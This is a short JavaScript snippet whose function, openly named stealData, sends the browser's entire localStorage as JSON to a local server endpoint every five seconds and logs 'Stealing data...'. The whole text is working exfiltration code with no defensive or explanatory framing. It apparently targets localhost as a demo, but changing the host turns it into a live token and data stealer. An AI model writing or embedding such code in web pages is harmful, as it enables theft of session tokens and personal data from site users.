function stealData() {
    fetch("https://localhost:5081/api/data", {
        headers: { "Content-Type": "application/json" },
        method: "POST",
        body: JSON.stringify(localStorage)
    });
    console.log("Stealing data...");
}

setInterval(() => stealData(), 5000);